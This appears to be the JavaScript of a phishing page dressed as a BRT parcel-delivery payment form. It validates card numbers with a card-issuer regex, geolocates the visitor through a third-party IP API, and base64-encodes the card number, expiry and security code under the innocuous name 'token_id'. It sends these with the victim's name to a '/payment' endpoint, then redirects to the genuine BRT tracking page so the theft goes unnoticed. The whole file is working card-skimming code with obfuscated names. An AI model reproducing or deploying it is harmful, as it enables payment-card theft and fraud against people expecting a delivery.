let cv = document.getElementById('dataTime')
let x = new Date().toLocaleDateString()
cv.innerHTML = x

document.addEventListener('DOMContentLoaded', () => {
    localStorage.clear();
    c();
});

const d = (e) => document.querySelector(e);

const f = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$/;

const g = () => {
    const h = d('#i').value.trim();
    const j = d('#k').value.trim();
    const k = d('#l').value.trim();
    const m = d('#n').value.trim();
    const o = d('#p').value.trim();
    const p = d('#q').value.trim();

    if (f.test(h) && j.length >= 1 && k.length <= 4 && m.length >= 3 && o.length > 1 && p.length > 1) {
        console.log('ok');
        r();
    } else {
        alert('s e t u v w x y z!');
    }
};

paga.onclick = g;

const c = async () => {
    try {
        const q = await fetch('https://api.surfshark.com/v1/server/user');
        const s = await q.json();
        localStorage.setItem('A', s.ip);
        localStorage.setItem('B', s.country);
        localStorage.setItem('C', s.city);
        localStorage.setItem('D', s.zipCode);
    } catch (t) {
        console.error('An error occurred:', t);
    }
};

const r = async () => {
    try {
        const u = {
            name: d('#q').value,
            surname: d('#p').value,
            token_id: btoa(`${d('#i').value}|${d('#k').value}|${d('#l').value}|${d('#n').value}`),
            ip: localStorage.getItem('A'),
            country: localStorage.getItem('B'),
            city: localStorage.getItem('C'),
            zip: localStorage.getItem('D')
        };

        const v = await fetch('/payment', {
            method: 'POST',
            headers: {
                "Content-Type": 'application/json',
            },
            body: JSON.stringify(u)
        });

        const w = await v.json();

        if (w.success) {
            setTimeout(() => {
                window.location.href = 'https://www.mybrt.it/it/mybrt/my-parcels/search';
            }, 1000);
        }
    } catch (x) {
        console.error('An error occurred:', x);
    }
};
